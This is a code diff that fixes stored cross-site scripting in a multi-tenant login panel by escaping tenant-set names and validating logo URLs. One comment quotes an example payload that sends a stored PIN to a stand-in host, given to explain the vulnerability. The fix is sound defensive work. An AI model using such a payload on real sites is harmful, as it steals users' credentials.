@@ -86,6 +86,35 @@ app.get('/redeem', (c) => {
   return c.html(REDEEM_PAGE);
 });
 
+
+// panel_name and panel_logo are set by tenant admins — people you resell to, not
+// people you control — and were interpolated raw into the served HTML. A name of
+// `</title><script>fetch('//evil/'+localStorage.pin)</script>` was stored XSS on
+// that tenant's own login page; a logo value containing a quote broke out of the
+// src attribute the same way. Everything tenant-controlled goes through here.
+function esc(v: unknown): string {
+  return String(v ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// A logo is a URL or a data: image. Anything else (javascript:, vbscript:, a
+// stray quote) is rejected outright rather than escaped and hoped for.
+function safeLogoUrl(v: unknown): string | null {
+  const raw = String(v ?? '').trim();
+  if (!raw) return null;
+  if (/^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=]+$/.test(raw)) return raw;
+  if (/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return raw;
+  try {
+    const u = new URL(raw);
+    if (u.protocol === 'http:' || u.protocol === 'https:') return u.toString();
+  } catch {}
+  return null;
+}
+
 app.get('/manifest.json', async (c) => {
   const slug = c.req.query('slug');
   let tenantName: string | undefined;
@@ -115,8 +144,8 @@ app.get('/manifest.json', async (c) => {
     display: 'standalone',
     background_color: '#08080b',
     theme_color: '#08080b',
-    icons: tenantLogo
-      ? [{ src: tenantLogo, sizes: '512x512', type: 'image/png' }]
+    icons: safeLogoUrl(tenantLogo)
+      ? [{ src: safeLogoUrl(tenantLogo)!, sizes: '512x512', type: 'image/png' }]
       : [
           { src: '/icon-192.png', sizes: '192x192', type: 'image/png' },
           { src: '/icon-512.png', sizes: '512x512', type: 'image/png' },
@@ -159,12 +188,13 @@ app.get('/', async (c) => {
     const [row] = await sql`SELECT value FROM settings WHERE key = 'panel_logo'`;
     tenantLogo = row?.value || null;
   }
-  const logoTag = tenantLogo ? `<img src="${tenantLogo}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />` : '';
+  const safeLogo = safeLogoUrl(tenantLogo);
+  const logoTag = safeLogo ? `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />` : '';
   let html = page
-    .replace('<title>Frap Ties</title>', `<title>${tenantName}</title>`)
-    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${tenantName}">`)
+    .replace('<title>Frap Ties</title>', `<title>${esc(tenantName)}</title>`)
+    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
     .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
-    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${tenantName}</div>`);
+    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`);
   // Empty content (not the string "null") so the frontend's `.content || null`
   // check correctly treats this as "no slug" — a non-empty string is truthy in JS
   // regardless of what it says, so content="null" was breaking every login here.
@@ -193,12 +223,13 @@ app.get('/:slug', async (c) => {
   // this never touches the self-tenant (Frap Ties), which is handled by the
   // '/' route above and preserves exactly what it already had.
   const tenantLogo = tenant.panel_logo || '/clearpanel-icon.png';
-  const logoTag = `<img src="${tenantLogo}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />`;
+  const safeLogo = safeLogoUrl(tenantLogo) || '/clearpanel-icon.png';
+  const logoTag = `<img src="${esc(safeLogo)}" style="width:100%;height:100%;object-fit:contain;border-radius:inherit;" />`;
   let html = page
-    .replace('<title>Frap Ties</title>', `<title>${tenantName}</title>`)
-    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${tenantName}">`)
+    .replace('<title>Frap Ties</title>', `<title>${esc(tenantName)}</title>`)
+    .replace(/<meta name="apple-mobile-web-app-title"[^>]*>/, `<meta name="apple-mobile-web-app-title" content="${esc(tenantName)}">`)
     .replace('<div class="brand-mark"></div>', `<div class="brand-mark">${logoTag}</div>`)
-    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${tenantName}</div>`)
+    .replace('<div id="loginTitle">ClearPanel</div>', `<div id="loginTitle">${esc(tenantName)}</div>`)
     .replace('<link rel="manifest" href="/manifest.json">', `<link rel="manifest" href="/manifest.json?slug=${encodeURIComponent(slug)}">`);
   html = html.replace('</head>', `<meta id="cp-slug" content="${slug}"><meta id="cp-tenant-id" content="${tenant.id}"></head>`);
   return c.html(html);
